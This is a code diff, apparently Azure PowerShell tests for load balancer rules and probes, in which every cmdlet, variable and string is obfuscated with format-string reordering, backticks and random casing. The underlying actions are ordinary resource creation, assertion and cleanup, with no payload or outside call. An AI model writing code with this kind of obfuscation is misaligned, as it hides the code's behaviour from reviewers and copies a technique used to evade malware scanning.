+        &("{4}{0}{2}{1}{3}" -f'se','Nul','rt-Not','l','As') ${v`loAdbAlAN`Ci`N`grule};
+        &("{3}{1}{0}{2}" -f'ser','s','t-True','A') { &("{3}{1}{4}{0}{2}" -f 'dle','ck','tReturnType','Che','-Cm') ("{5}{6}{2}{4}{1}{3}{0}{7}"-f 'i','ancerRuleCo','a','nf','l','Ge','t-AzLoadB','g') ${V`LOAdbal`A`NCINgRUle} };
+        &("{2}{0}{1}"-f 'ert-Are','Equal','Ass') ${rnA`ME} ${vLoadbal`An`cin`g`RU`LE}."N`AME";
+        &("{4}{3}{2}{1}{0}"-f 'l','a','eEqu','sert-Ar','As') ${P`R`OtOcoL} ${VLoa`d`BAl`A`N`ciNgRU`LE}."prOtO`COl";
+        &("{1}{2}{0}" -f'l','Assert-','AreEqua') ${LO`AD`D`istRibu`TioN} ${Vl`oa`dBalA`N`CInG`R`Ule}."lO`AdDIstR`I`BU`T`ion";
+        &("{3}{4}{0}{2}{1}"-f 'e','ual','Eq','Assert-','Ar') ${fRo`NTenD`pORT} ${v`LoA`dbALanCiNg`RUle}."froNte`N`dPO`Rt";
+        &("{1}{0}{3}{2}" -f 'Equ','Assert-Are','l','a') ${bA`CKEn`D`PoRT} ${vL`oADBA`laN`CinGRuLe}."BaC`kendpo`Rt";
+        &("{3}{1}{0}{2}" -f 't-AreEq','sser','ual','A') ${iDLe`Time`o`UTiNmInUtES} ${vl`oa`dBaL`AN`cING`RUle}."IDL`eTi`MeouTInmi`NUTeS";
+        &("{2}{1}{3}{4}{0}"-f 'l','e','Assert-Ar','E','qua') ${EN`Ab`leFLoa`TINgiP} ${v`l`oaDbAlANcInGr`Ule}."ENA`BLeFlOA`T`iNGIP";
+        &("{2}{1}{3}{0}"-f'ual','se','As','rt-AreEq') ${E`NabLetcp`Res`Et} ${Vlo`Ad`Bal`An`CIn`GRule}."eNAblET`CPr`eset";
+
+        
+        ${l`iStloa`dba`lAn`CINgr`Ule} = &("{5}{2}{4}{3}{0}{1}"-f 'uleCo','nfig','zLoa','cerR','dBalan','Get-A') -LoadBalancer ${v`loaD`B`AlAn`CER};
+        &("{0}{2}{1}" -f 'As','Null','sert-Not') (${L`Ist`LoAD`B`A`L`AnCiNgrule} | &("{1}{3}{2}{0}"-f'ct','Wh','e-Obje','er') { ${_}."NA`mE" -eq ${rNa`ME} });
+
+        
+        ${VLOa`dB`ALAn`CEr} = &("{6}{0}{2}{4}{3}{1}{7}{5}{8}" -f'AzLoa','rRul','dBala','ce','n','i','Set-','eConf','g') -Name ${Rna`Me} -LoadBalancer ${vl`oA`dBALaN`CeR} -FrontendIpConfiguration ${FrontEn`DiPCOnf`IGur`A`TIoN} -BackendAddressPool ${BaCkENDA`ddReS`s`Po`oL} -Probe ${pr`obE} -Protocol ${pro`ToCol`Set} -LoadDistribution ${L`OADD`iS`TRiBUT`IoNset} -FrontendPort ${F`R`ONtEnDPO`RtSet} -BackendPort ${BAC`keNdpOrT`Set} -IdleTimeoutInMinutes ${idlETim`E`Outi`NmI`NuT`e`sS`Et};
+        &("{0}{2}{3}{1}"-f'A','l','ssert-Not','Nul') ${VLoaDB`A`LAn`CeR};
+        ${Vl`O`ADBAla`NCer} = &("{1}{2}{3}{4}{0}"-f'r','Set-Az','Load','B','alance') -LoadBalancer ${vLoAD`B`Al`AncEr};
+        &("{3}{2}{1}{0}"-f 'tNull','No','t-','Asser') ${VL`OADBal`Ancer};
+
+        
+        ${vloaDB`Al`ANCIN`G`RuLe} = &("{3}{1}{2}{5}{0}{4}{6}"-f 'u','et-Az','Lo','G','leC','adBalancerR','onfig') -LoadBalancer ${vL`oaDb`Al`AncEr} -Name ${r`NAME};
+        &("{0}{2}{1}"-f 'A','ert-NotNull','ss') ${VLOaDb`AlANcinG`RU`lE};
+        &("{0}{3}{1}{2}"-f 'Assert','Tru','e','-') { &("{4}{0}{1}{3}{2}"-f'd','letRetur','Type','n','Check-Cm') ("{0}{4}{3}{7}{2}{6}{1}{5}{8}" -f'Ge','l','BalancerR','L','t-Az','eCon','u','oad','fig') ${VLOaDBaL`A`NcING`RuLE} };
+        &("{1}{0}{2}{3}" -f'rt-AreEq','Asse','ua','l') ${r`NA`Me} ${V`lOadBA`lANciNgr`U`Le}."n`Ame";
+        &("{4}{2}{1}{3}{0}"-f 'ual','-A','ssert','reEq','A') ${pROtO`CO`lsET} ${VlOAd`B`AlaNci`NgRU`lE}."pR`OT`oCoL";
+        &("{3}{4}{1}{0}{2}" -f'eEqua','r','l','Assert','-A') ${l`OAD`dIStrIBu`Ti`oNS`ET} ${Vl`OAD`BaLaNci`NgRulE}."LoA`Dd`iS`TRI`BUtION";
+        &("{0}{2}{1}" -f'Ass','qual','ert-AreE') ${FR`OnTenDp`Or`T`set} ${vl`oaDBaLaNc`iNgRU`LE}."f`RoNT`ENDp`oRT";
+        &("{4}{1}{0}{2}{3}"-f'Are','ert-','E','qual','Ass') ${B`AckE`N`DpORts`ET} ${vlO`Adb`Ala`NciNg`R`UlE}."baCK`e`NDport";
+        &("{1}{2}{0}"-f'qual','Assert-','AreE') ${IDLetime`OUt`inmI`NUt`EsSet} ${VloA`dBAlAncI`NgrU`Le}."i`DLE`Ti`Me`OUTInmInutEs";
+        &("{2}{1}{3}{4}{0}" -f 'al','sert','As','-','AreEqu') ${eN`ABL`Ef`L`OatingiP`S`Et} ${vlOad`BA`la`Nci`NGRULe}."e`NA`BL`eflO`ATinGiP";
+        &("{1}{3}{0}{2}" -f'ua','Assert','l','-AreEq') ${EN`AbletCPres`ET`sET} ${v`LOAdBA`LaNcI`N`GrULe}."en`Ablet`cp`RESeT";
+
+        
+        ${l`IsTLOAdb`ALaNc`i`NGrULE} = &("{5}{4}{2}{6}{0}{1}{3}"-f'rRu','leCo','-AzLoadBalan','nfig','t','Ge','ce') -LoadBalancer ${vLO`AdbAla`Nc`er};
+        &("{3}{2}{0}{1}" -f 'Nu','ll','-Not','Assert') (${l`isTLO`ADB`ALaNc`IN`G`Rule} | &("{2}{1}{0}"-f 'ct','e','Where-Obj') { ${_}."n`AMe" -eq ${r`Na`ME} });
+
+        
+        ${V`LO`Adb`AlaNcEr} = &("{0}{7}{4}{3}{1}{5}{2}{6}"-f 'Ad','an','erRuleCo','adBal','o','c','nfig','d-AzL') -Name ${r`NamE`ADd} -LoadBalancer ${v`L`OAD`BalAN`cer} -FrontendIpConfiguration ${fROnteNDiP`co`Nf`igU`RatION} -BackendAddressPool ${bA`cKENd`Addr`E`SspOOl} -Probe ${p`RObE} -Protocol ${Pr`oTOCOLa`dD} -LoadDistribution ${L`oAD`DIstri`BUTIoN`A`DD} -FrontendPort ${fR`o`NtENdp`Or`TADD} -BackendPort ${baCk`enDPorT`ADd} -IdleTimeoutInMinutes ${iD`LeTimE`O`UT`iNminuTES`ADd};
+        &("{2}{3}{0}{1}" -f '-NotN','ull','As','sert') ${vlo`ADBa`L`AN`ceR};
+        ${vL`oAdbalA`N`CEr} = &("{2}{0}{3}{1}{4}"-f 'AzLo','anc','Set-','adBal','er') -LoadBalancer ${VLOA`DbaLAn`c`ER};
+        &("{1}{2}{0}{3}" -f'l','Assert-NotN','u','l') ${vLOAd`BAlAn`c`er};
+
+        
+        ${Vl`o`Adb`Al`AncInGruLe} = &("{1}{3}{5}{6}{2}{4}{0}" -f 'Config','G','ce','et','rRule','-AzLo','adBalan') -LoadBalancer ${VlO`AdbaLA`NCeR} -Name ${R`NA`meaDD};
+        &("{4}{1}{3}{2}{0}"-f'l','otN','l','u','Assert-N') ${vL`O`ADBalA`NC`I`NgRULE};
+        &("{2}{0}{3}{1}" -f 'ert-','e','Ass','Tru') { &("{0}{5}{2}{3}{1}{4}" -f'Check-','turnT','e','tRe','ype','Cmdl') ("{6}{5}{3}{1}{4}{2}{0}"-f 'RuleConfig','-AzLoadBa','r','t','lance','e','G') ${vloAdBAl`AN`c`i`N`GRUlE} };
+        &("{0}{2}{1}{3}"-f 'Assert','Are','-','Equal') ${RNAm`EADd} ${VLo`AD`BalA`NCinGr`ULE}."n`AmE";
+        &("{1}{3}{0}{2}"-f 'u','Assert-Are','al','Eq') ${p`R`otOCO`LaDD} ${vlOa`DbalA`Nc`i`NgRU`le}."prO`To`CoL";
+        &("{1}{2}{0}"-f 'rt-AreEqual','Ass','e') ${loaD`d`IST`RiBUTI`Ona`Dd} ${V`L`OaDBA`l`ANCI`NGRuLE}."lOADD`iStr`i`B`U`TiOn";
+        &("{1}{2}{0}"-f'rt-AreEqual','Ass','e') ${fRoNTen`D`P`Ort`Add} ${VLoA`d`BaLaNCi`N`gruLe}."F`R`oNTEnD`PorT";
+        &("{2}{0}{1}{3}{4}" -f'er','t-AreEq','Ass','ua','l') ${b`ACkenD`porta`dD} ${VLoA`D`BAL`Anc`INgr`UlE}."BA`Ck`enDP`ORT";
+        &("{1}{2}{0}"-f'reEqual','Ass','ert-A') ${ID`LEti`me`oUTiNMI`Nu`TEs`A`dd} ${Vl`oAdbalaN`cI`NGRULE}."I`dlETiMEOUTinmI`N`Ut`ES";
+        &("{2}{3}{0}{1}" -f 'sert-AreEq','ual','A','s') ${ENa`BlefLO`AT`in`G`Ip`ADd} ${vlo`ADbAL`AnCin`Gr`UlE}."e`NaBle`FL`Oating`iP";
+        &("{2}{1}{4}{3}{0}" -f 'al','rt-','Asse','eEqu','Ar') ${en`AbLEtCp`R`esE`Tadd} ${vL`oA`Db`AlanCINg`RulE}."eNa`B`L`EtcpREset";
+
+        
+        ${l`IS`TlOaDBaLAnCin`GRU`Le} = &("{3}{0}{2}{4}{1}"-f 'zLoad','cerRuleConfig','B','Get-A','alan') -LoadBalancer ${VlOaD`Ba`l`A`Ncer};
+        &("{4}{3}{2}{1}{0}" -f 'ull','N','rt-Not','sse','A') (${L`I`S`TL`oAd`BAl`ANCINgrUlE} | &("{2}{1}{3}{0}" -f 't','e-Obj','Wher','ec') { ${_}."Na`ME" -eq ${Rna`m`EADd} });
+
+        
+        &("{2}{3}{0}{1}{4}{5}"-f 'ow','s','Asser','t-Thr','Conta','ins') { &("{4}{6}{2}{5}{3}{1}{0}{7}"-f'rRuleConfi','ce','AzLo','dBalan','Add','a','-','g') -Name ${r`NamE`ADD} -LoadBalancer ${v`lO`A`dbAlAncER} -FrontendIpConfiguration ${fRONTENdi`P`c`OnfI`Gur`ATion} -BackendAddressPool ${b`ACkeNdA`dDrE`SSpo`OL} -Probe ${pRO`BE} -Protocol ${pR`O`TOc`oLadD} -LoadDistribution ${lo`ADDis`T`RiBuTIOnA`dd} -FrontendPort ${frOn`T`e`NDpoRTADd} -BackendPort ${ba`CK`e`Nd`PORtadD} -IdleTimeoutInMinutes ${I`DLETImEou`TiNm`InUtes`AdD} } ("{2}{0}{3}{1}"-f 'ady ','sts','alre','exi');
+
+        
+        ${VlO`A`dbalA`N`CER} = &("{0}{6}{3}{7}{5}{2}{4}{1}" -f 'Re','Config','nc','-Az','erRule','dBala','move','Loa') -LoadBalancer ${V`LoADBALA`Nc`Er} -Name ${r`NaMEadd};
+        ${vL`OAdbA`L`AnC`eR} = &("{4}{5}{2}{3}{1}{0}"-f'uleConfig','cerR','adBala','n','Remo','ve-AzLo') -LoadBalancer ${vl`Oadba`Lan`C`eR} -Name ${R`N`Ame};
+        
+        ${Vl`OaD`BALan`Cer} = &("{1}{4}{2}{6}{0}{5}{3}" -f 'ncer','Rem','zLoad','eConfig','ove-A','Rul','Bala') -LoadBalancer ${vlOA`Db`A`lAnc`ER} -Name ${RNa`ME};
+        
+        ${v`LoADB`AlA`N`CER} = &("{4}{3}{0}{2}{1}"-f'LoadBa','r','lance','-Az','Set') -LoadBalancer ${V`LOA`d`BalAnCER};
+        &("{4}{2}{0}{1}{3}" -f '-NotN','u','rt','ll','Asse') ${v`LOAD`BaLA`NceR};
+
+        
+        &("{3}{2}{1}{4}{0}"-f'ntains','hrow','T','Assert-','sCo') { &("{6}{1}{2}{5}{4}{7}{0}{3}"-f'n','A','zLoadBalan','fig','uleC','cerR','Get-','o') -LoadBalancer ${VLoA`DBa`LAncEr} -Name ${RNA`ME} } ("{0}{1}{3}{2}{8}{10}{9}{5}{6}{4}{7}" -f 'Sequ','e',' con','nce','ing ele','mat','ch','ment','tains ',' ','no');
+
+        
+        &("{0}{5}{4}{1}{2}{3}"-f'Assert-Thr','s','Cont','ains','w','o') { &("{6}{5}{4}{3}{0}{2}{1}{7}{8}" -f'e','le','rRu','zLoadBalanc','A','t-','Se','Confi','g') -Name ${RnA`Me} -LoadBalancer ${v`lOA`d`BaL`ANCer} -FrontendIpConfiguration ${FR`onT`E`NDIp`coNf`iguration} -BackendAddressPool ${BA`cK`EnDAddre`sSpO`ol} -Probe ${Pr`OBe} -Protocol ${pR`otOcO`L`sET} -LoadDistribution ${L`oA`Dd`IstR`iBuTI`ONSeT} -FrontendPort ${F`ROn`TEnDp`OrtSet} -BackendPort ${B`AckeN`dPoR`Ts`Et} -IdleTimeoutInMinutes ${iD`Le`TimeouTi`N`MI`N`Ut`EsSEt} } ("{1}{2}{0}{3}"-f'o','doe','s n','t exist');
+    }
+    finally
+    {
+        
+        &("{3}{1}{2}{0}"-f'up','lean-Resour','ceGro','C') ${RgN`A`ME};
+    }
+}
+
+
+function tes`T-PR`oBE`crud`M`I`Nimal`PA`RaMEtErs
+{
+    
+    ${RGnA`mE} = &("{5}{0}{6}{2}{1}{3}{4}" -f'et','ceGrou','our','pNam','e','G','-Res');
+    ${R`glO`CaTion} = &("{0}{1}{2}{3}{4}" -f 'Get-Provider','L','ocat','io','n') ("{4}{1}{3}{2}{0}"-f 'ent','u','m','rceManage','Reso');
+    ${Rna`mE} = &("{2}{0}{3}{1}"-f '-Re','ceName','Get','sour');
+    ${r`NamEa`dD} = "${rname}Add";
+    ${LOC`A`TIon} = &("{0}{3}{2}{1}{4}"-f 'Get-Pr','ti','viderLoca','o','on') ("{2}{7}{5}{0}{1}{3}{6}{4}" -f 'k','/','M','lo','rs','etwor','adBalance','icrosoft.N');
+    
+    ${PO`RT} = 2424;
+    ${Int`eRVa`linsECOn`dS} = 6;
+    ${PrObec`o`Unt} = 4;
+    
+    ${P`ortS`eT} = 4244;
+    ${IntE`R`V`ALI`NSEcondss`et} = 14;
+    ${ProBeC`oUnt`s`et} = 7;
+    
+    ${p`ORt`AdD} = 443;
+    ${iNterVA`LinseC`O`ND`S`AdD} = 11;
+    ${P`RObeC`oU`NT`Add} = 5;
+    
+    ${puBl`IciPaDD`Re`SS`N`AMe} = ("{2}{0}{1}{4}{3}" -f'Add','re','PublicIP','me','ssNa');
+    ${pub`L`IciP`ADDreSsALLoca`Ti`oNMEthOd} = ("{0}{1}"-f 'Sta','tic');
+    ${FROn`TE`NDipCo`NFIGu`Ra`TionNA`mE} = ("{0}{1}{3}{8}{5}{2}{7}{4}{6}" -f'Fronte','nd','a','IP','n','onfigur','Name','tio','C');
+
+    try
+    {
+        ${Reso`URc`eg`R`OUP} = &("{0}{2}{1}{4}{3}{5}" -f'Ne','-AzRe','w','rc','sou','eGroup') -Name ${r`GNa`mE} -Location ${RGL`oCati`ON};
+
+        
+        ${PublICiP`AD`dREsS} = &("{1}{0}{3}{2}" -f'li','New-AzPub','ss','cIPAddre') -ResourceGroupName ${RGn`Ame} -Location ${LO`c`ATIoN} -Name ${pUBL`iCIPa`D`dRe`Ss`NAme} -AllocationMethod ${puBliC`iPad`dreS`SalLoCA`TIO`NmEth`Od};
+        ${f`RONtE`NDI`pcOnF`Igu`RA`Ti`on} = &("{9}{5}{3}{1}{10}{8}{6}{7}{0}{4}{2}" -f'ntendIpC','zLoa','nfig','-A','o','w','cer','Fro','alan','Ne','dB') -Name ${fro`NT`E`NdIpCONFi`GUrAtio`NnAmE} -PublicIpAddress ${PublIciP`A`dd`ResS};
+
+        
+        ${Vpro`BE} = &("{5}{2}{0}{4}{3}{1}" -f'alancer','fig','ew-AzLoadB','obeCon','Pr','N') -Name ${r`NA`mE} -Port ${pO`Rt} -IntervalInSeconds ${I`NTE`R`VALINsEcONds} -ProbeCount ${p`Rob`EC`OUnT};
+        &("{3}{1}{0}{2}" -f'ert-Not','ss','Null','A') ${v`Probe};
+        &("{1}{0}{2}" -f'u','Assert-Tr','e') { &("{5}{3}{6}{2}{0}{4}{1}"-f 't','rnType','dletRe','heck','u','C','-Cm') ("{4}{2}{0}{1}{7}{8}{3}{5}{6}" -f'-A','zL','ew','d','N','Balanc','erProbeConfig','o','a') ${vpRo`BE} };
+        ${vl`o`A`dbalANCer} = &("{2}{3}{0}{4}{1}"-f 'adB','lancer','N','ew-AzLo','a') -ResourceGroupName ${rg`N`AME} -Name ${rNA`mE} -Probe ${vPr`obE} -FrontendIPConfiguration ${f`R`ONtEnDIPcoN`FI`guraT`ION} -Location ${LO`CA`Tion};
+        &("{4}{2}{3}{0}{1}"-f't-NotN','ull','ss','er','A') ${vL`oADb`A`LancER};
+        &("{0}{3}{1}{2}"-f'Asse','t','-AreEqual','r') ${r`NAMe} ${vpR`o`BE}."nA`Me";
+        &("{4}{3}{1}{2}{0}" -f'qual','t-A','reE','er','Ass') ${po`RT} ${V`PRO`BE}."p`OrT";
+        &("{1}{0}{2}" -f'ert-AreE','Ass','qual') ${InTE`R`VAlinSec`O`NdS} ${vPR`O`BE}."INTeR`VaLinSE`C`oNdS";
+        &("{3}{2}{0}{1}" -f 'rt','-AreEqual','se','As') ${pRO`BecO`UnT} ${vp`Ro`BE}."Nu`mb`ERO`FPr`OBEs";
+
+        
+        ${V`pr`obe} = &("{2}{4}{7}{3}{1}{5}{0}{6}{8}" -f'ancerP','a','Ge','o','t-Az','dBal','robe','L','Config') -LoadBalancer ${Vl`O`ADbaL`ANC`ER} -Name ${R`N`AmE};
+        &("{2}{0}{4}{3}{1}" -f 'se','ll','As','t-NotNu','r') ${vpR`ObE};
+        &("{1}{0}{2}" -f'e','Ass','rt-True') { &("{0}{3}{4}{1}{2}" -f'Chec','letRetu','rnType','k-Cm','d') ("{1}{2}{5}{0}{3}{4}"-f'adBalancerP','Get','-Az','robeCon','fig','Lo') ${VP`ROBe} };
+        &("{2}{0}{1}{3}" -f'rt-AreEq','ua','Asse','l') ${RNa`mE} ${vP`Ro`BE}."Na`Me";
+        &("{2}{0}{1}{3}" -f 'rt-','AreE','Asse','qual') ${P`ort} ${v`p`Robe}."Po`Rt";
+        &("{3}{1}{0}{2}"-f'a','rt-AreEqu','l','Asse') ${iNTe`Rv`Alins`E`coNDS} ${vPr`ObE}."Inte`Rv`AlIns`eC`on`DS";
+        &("{1}{2}{4}{3}{0}"-f'qual','Asse','r','AreE','t-') ${proBE`cO`UNt} ${vp`ROBe}."nu`MB`E`RofProB`eS";
+
+        
+        ${li`s`TpROBe} = &("{3}{0}{4}{1}{2}{5}" -f 'A','rob','eCo','Get-','zLoadBalancerP','nfig') -LoadBalancer ${vL`oADBalA`NcER};
+        &("{3}{0}{1}{4}{2}"-f'-N','o','Null','Assert','t') (${lIsT`pro`Be} | &("{0}{3}{1}{2}" -f'W','ere-Ob','ject','h') { ${_}."nA`ME" -eq ${R`NaME} });
+
+        
+        ${V`LoA`d`BaLANceR} = &("{0}{5}{1}{6}{4}{2}{3}"-f'Set-','oad','erP','robeConfig','anc','AzL','Bal') -Name ${r`N`AMe} -LoadBalancer ${v`LOaDb`ALANcER} -Port ${P`oRT`sEt} -IntervalInSeconds ${InT`ER`ValiN`SeCon`dSSeT} -ProbeCount ${pRO`B`E`coUN`TseT};
+        &("{3}{0}{2}{1}" -f '-','tNull','No','Assert') ${V`lOadB`AlAN`cER};
+        ${V`loAdBa`LancER} = &("{2}{4}{3}{5}{0}{1}" -f'ala','ncer','Set','AzLoad','-','B') -LoadBalancer ${V`l`o`AdBAlancEr};
+        &("{2}{1}{0}{4}{3}"-f '-','sert','As','otNull','N') ${VLoaD`B`AlaNCEr};
+
+        
+        ${vpro`Be} = &("{0}{4}{2}{3}{7}{5}{8}{1}{6}" -f'Get-','on','oa','d','AzL','rPr','fig','Balance','obeC') -LoadBalancer ${vlO`A`dbalaNCer} -Name ${Rn`A`Me};
+        &("{2}{1}{3}{0}"-f 'l','N','Assert-Not','ul') ${VP`R`ObE};
+        &("{2}{0}{1}{3}" -f'T','ru','Assert-','e') { &("{1}{2}{4}{0}{3}" -f 'rnTy','Check-Cmd','letRet','pe','u') ("{1}{5}{4}{2}{6}{3}{0}" -f'g','Get-','LoadBa','obeConfi','z','A','lancerPr') ${Vp`Ro`BE} };
+        &("{2}{1}{0}{4}{3}" -f 'eEq','sert-Ar','As','al','u') ${rn`AME} ${vpR`oBe}."n`Ame";
+        &("{1}{3}{4}{2}{0}"-f 'qual','Asser','AreE','t','-') ${P`or`TSET} ${Vpr`o`Be}."po`RT";
+        &("{0}{1}{2}" -f 'A','ssert-A','reEqual') ${interv`AL`I`NS`econD`ssET} ${v`pr`oBE}."i`NtErvA`lIN`sec`o`NdS";
+        &("{1}{0}{2}"-f're','Assert-A','Equal') ${P`ROBEc`ou`Nt`set} ${V`prObE}."nUmBeR`O`F`prOBeS";
+
+        
+        ${l`IStpro`Be} = &("{6}{4}{2}{1}{3}{5}{0}"-f 'fig','Bal','zLoad','ancerProbeCo','A','n','Get-') -LoadBalancer ${VLO`A`DbALanceR};
+        &("{3}{2}{0}{1}{4}" -f'-NotN','u','ssert','A','ll') (${LiST`PRO`BE} | &("{3}{1}{0}{2}" -f'e','her','-Object','W') { ${_}."Na`mE" -eq ${rNa`mE} });
+
+        
+        ${v`Lo`AdBa`lAN`ceR} = &("{8}{6}{5}{0}{4}{1}{2}{7}{3}"-f'oadBalanc','P','ro','Config','er','AzL','dd-','be','A') -Name ${rN`Am`EADD} -LoadBalancer ${V`lOa`D`BalAN`cER} -Port ${p`OrtA`dd} -IntervalInSeconds ${INterv`AlI`N`sEcoNd`s`Add} -ProbeCount ${PrO`BE`C`OUn`TaDd};
+        &("{1}{2}{0}{3}"-f 'ert-N','A','ss','otNull') ${v`lOAdb`Al`ANcER};
+        ${V`loA`D`BAlAnCER} = &("{5}{3}{1}{4}{0}{2}"-f'anc','Ba','er','zLoad','l','Set-A') -LoadBalancer ${VLOAD`B`Alan`cER};
+        &("{0}{1}{3}{2}"-f 'Assert-','Not','ull','N') ${V`LOaDb`AlAnc`Er};
+
+        
+        ${V`prOBe} = &("{2}{1}{3}{5}{4}{0}" -f 'nfig','et-AzLo','G','adBalancerPr','beCo','o') -LoadBalancer ${VLo`AD`BALAn`cer} -Name ${rnamE`A`dD};
+        &("{2}{1}{0}"-f 'ull','t-NotN','Asser') ${VpRO`BE};
+        &("{1}{2}{0}{3}"-f'-Tru','Ass','ert','e') { &("{1}{0}{5}{2}{3}{4}"-f 'k','Chec','dletRetu','rnT','ype','-Cm') ("{8}{2}{3}{4}{5}{0}{6}{1}{7}"-f 'rProb','C','et-A','zLoa','dBalan','ce','e','onfig','G') ${Vp`RObE} };
+        &("{0}{2}{1}"-f'As','l','sert-AreEqua') ${R`NA`MeaDd} ${v`pro`Be}."N`AMe";
+        &("{0}{1}{2}" -f 'Assert-A','reEqua','l') ${Po`R`TadD} ${V`PRo`Be}."Po`Rt";
+        &("{3}{4}{2}{1}{0}" -f 'ual','eEq','Ar','Asse','rt-') ${I`NtE`RvAl`iNseCOndsa`Dd} ${Vp`RObe}."INTErV`Alin`s`ECo`N`DS";
+        &("{3}{2}{0}{1}"-f'r','eEqual','ert-A','Ass') ${PRobEcouN`T`A`dD} ${vPr`obE}."nUm`B`E`RO`FpRobes";
+
+        
+        ${liST`PR`obe} = &("{0}{3}{4}{2}{1}" -f 'G','erProbeConfig','nc','et-Az','LoadBala') -LoadBalancer ${VloadbA`L`An`ceR};
+        &("{1}{3}{2}{4}{0}"-f'ull','Asse','-No','rt','tN') (${L`iSTPr`OBe} | &("{1}{0}{2}{3}"-f '-Obje','Where','c','t') { ${_}."Na`Me" -eq ${Rna`MEa`dD} });
+
+        
+        &("{3}{2}{0}{4}{1}" -f'sCont','ns','ert-Throw','Ass','ai') { &("{4}{6}{0}{2}{7}{1}{8}{5}{3}"-f'LoadBala','r','n','beConfig','Ad','o','d-Az','ce','Pr') -Name ${r`NA`mE`ADD} -LoadBalancer ${V`LOad`BaLanC`ER} -Port ${pO`Rt`AdD} -IntervalInSeconds ${iNtErV`AlI`NSEcOND`SaDd} -ProbeCount ${P`RoBE`cOuN`TA`DD} } ("{2}{3}{1}{0}"-f'xists','e','alre','ady ');
+
+        
+        ${VLoAdbA`lAN`c`eR} = &("{1}{6}{5}{3}{2}{0}{7}{4}"-f'Con','R','be','lancerPro','ig','adBa','emove-AzLo','f') -LoadBalancer ${vL`OAdBaLA`N`Cer} -Name ${rna`MeadD};
+        ${VlOa`DbA`laNc`eR} = &("{3}{4}{2}{5}{0}{1}" -f 'P','robeConfig','zLoad','Remove-','A','Balancer') -LoadBalancer ${Vl`oadbaL`ANc`Er} -Name ${rNA`mE};
+        
+        ${Vl`oADbAla`N`CER} = &("{2}{4}{3}{7}{6}{1}{5}{0}" -f'fig','eCo','Re','la','move-AzLoadBa','n','ob','ncerPr') -LoadBalancer ${VLOAD`Ba`l`An`CeR} -Name ${rna`Me};
+        
+        ${VLo`ADb`A`laN`CEr} = &("{1}{4}{3}{0}{2}{5}" -f'dBal','S','anc','-AzLoa','et','er') -LoadBalancer ${v`l`oadbALAnC`eR};
+        &("{2}{3}{0}{1}" -f'se','rt-NotNull','A','s') ${V`l`OA`dbALANC`ER};
+
+        
+        &("{4}{0}{1}{3}{2}{5}" -f 'ert-T','hr','onta','owsC','Ass','ins') { &("{4}{8}{6}{3}{2}{7}{0}{1}{5}" -f 'on','f','erPro','nc','Get-AzL','ig','dBala','beC','oa') -LoadBalancer ${v`L`O`AdBalanceR} -Name ${Rn`A`me} } ("{0}{4}{1}{6}{3}{2}{5}" -f'Sequ',' ','g','chin','ence contains',' element','no mat');
+
+        
+        &("{3}{1}{2}{0}{4}"-f 'n','ert-Th','rowsCo','Ass','tains') { &("{3}{0}{2}{5}{6}{7}{1}{4}" -f 'rPr','f','o','Set-AzLoadBalance','ig','beC','o','n') -Name ${rNA`mE} -LoadBalancer ${vlO`AdB`ALAn`CER} -Port ${por`TS`eT} -IntervalInSeconds ${I`N`T`ervALinsecOn`Ds`sET} -ProbeCount ${prO`BEcOunT`Set} } ("{3}{1}{2}{0}"-f 'st','o','es not exi','d');
+    }
+    finally
+    {
+        
+        &("{3}{0}{2}{1}{5}{4}"-f 'n-R','ourc','es','Clea','Group','e') ${R`G`NaMe};
+    }
+}
+
+
+function tES`T-`pr`OBECrUDaLL`paRAMetE`Rs
+{
+    
+    ${R`gN`AMe} = &("{6}{3}{5}{4}{0}{2}{1}"-f'N','e','am','t-Re','roup','sourceG','Ge');
+    ${Rg`l`oCatIOn} = &("{3}{2}{1}{0}{4}" -f 'erLocat','vid','Pro','Get-','ion') ("{1}{3}{2}{4}{0}"-f'ent','Re','ceMan','sour','agem');
+    ${R`N`Ame} = &("{0}{4}{2}{1}{3}"-f 'Ge','ourceNam','Res','e','t-');
+    ${r`Na`mea`dD} = "${rname}Add";
+    ${lO`cAt`i`ON} = &("{0}{3}{1}{5}{2}{4}"-f'Get-Pro','rL','atio','vide','n','oc') ("{2}{3}{0}{4}{5}{1}{6}" -f 't','adBalancer','Micr','osof','.Ne','twork/lo','s');
+    
+    ${Pr`ot`OcOl} = ("{1}{0}"-f'ttp','H');
+    ${P`ORT} = 2424;
+    ${i`NtervAL`iNs`Ec`ON`DS} = 6;
+    ${prO`BE`coUNT} = 4;
+    ${REquE`s`TPatH} = ("{0}{1}" -f'/crea','te');
+    
+    ${pr`OTO`c`oLset} = "Tcp";
+    ${Po`RtS`Et} = 4244;
+    ${INTeR`VAlInsECON`Ds`SET} = 14;
+    ${p`R`oB`ECountSEt} = 7;
+    
+    ${P`oRTa`dD} = 443;
+    ${I`NT`eRv`ALINseC`o`Nds`Add} = 11;
+    ${PrOb`E`CouNt`ADd} = 5;
+    
+    ${pu`B`L`ICipadd`REssnA`ME} = ("{2}{1}{3}{4}{5}{0}" -f'e','PA','PublicI','d','dressNa','m');
+    ${p`Ubl`iCIpaDdReSs`AlLOCatiO`NME`T`hOd} = ("{0}{1}"-f 'Stati','c');
+    ${F`Ro`NTE`NdiP`CONf`igu`RaTiONNAmE} = ("{0}{2}{5}{3}{1}{4}"-f'Fro','i','n','nf','gurationName','tendIPCo');
+
+    try
+    {
+        ${res`oU`RCegr`OuP} = &("{2}{0}{1}{3}" -f 'ourceGro','u','New-AzRes','p') -Name ${r`G`NAme} -Location ${rgloc`A`TiOn};
+
+        
+        ${PubliCIP`A`DD`RE`ss} = &("{5}{2}{0}{3}{1}{4}"-f '-AzPublic','PAdd','w','I','ress','Ne') -ResourceGroupName ${RG`NaME} -Location ${lOcaT`ION} -Name ${PU`Bli`CIPaD`D`ReSSnAme} -AllocationMethod ${pUb`LicipADD`REsSaLLOCA`TiONm`et`hOd};
+        ${f`RO`NtendiPco`NfigUR`Ati`ON} = &("{8}{3}{1}{2}{0}{6}{4}{7}{5}" -f 't','erFro','n','alanc','pConf','g','endI','i','New-AzLoadB') -Name ${frONte`N`diP`C`On`FiGURAt`Ionn`AME} -PublicIpAddress ${PUbLI`ciPaDDr`e`Ss};
+
+        
+        ${VP`R`obe} = &("{1}{4}{0}{6}{3}{2}{5}" -f 'Prob','New-AzL','nf','Co','oadBalancer','ig','e') -Name ${RNA`mE} -Protocol ${PRo`To`coL} -Port ${P`oRt} -IntervalInSeconds ${I`NtEr`VAl`In`sEc`OnDS} -ProbeCount ${PrO`Bec`o`UnT} -RequestPath ${Requ`eSt`P`ATH};
+        &("{0}{1}{2}" -f'Assert-Not','N','ull') ${VpR`o`Be};
